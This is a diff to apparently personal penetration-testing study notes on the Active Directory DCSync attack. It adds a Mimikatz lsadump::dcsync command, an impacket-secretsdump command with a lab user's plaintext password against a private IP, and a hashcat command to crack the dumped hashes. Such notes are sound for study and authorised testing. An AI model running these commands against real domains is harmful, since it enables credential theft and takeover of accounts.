@@ -23,10 +23,25 @@ alias:: Domain Controller Synchronization
 - DCSync Attack
 	- Once you got access to a user account in **one of those above mentioned groups** or with **all the above mentioned rights** assigned, then you can impersonate a domain controller. This allows you to request any user credentials from the domain.
 	- From Windows
-		- With [[Mimikatz]]
+		- You can run [[Mimikatz]] from a domain-joined machine. Let use it to request Dave's password hash.
+		  id:: 65a004e9-a008-4ad6-926f-fa50ba4608f6
 			- ```
+			  lsadump::dcsync /user:corp\dave
 			  ```
+			-
 	- From Linux
 		- With [[Impacket-secretsdump]]
 			- ```bash
+			  impacket-secretsdump \
+			  	-just-dc-user dave \
+			      corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 			  ```
+- Crack retrieved hashes
+	- With [[Hashcat]]
+		- id:: 65a00895-d0d1-4168-9b92-6dfa7401d3d7
+		  ```bash
+		  hashcat -m 1000 hashes.dcsync \
+		  	/usr/share/wordlists/rockyou.txt \
+		      -r /usr/share/hashcat/rules/best64.rule \
+		      --force
+		  ```
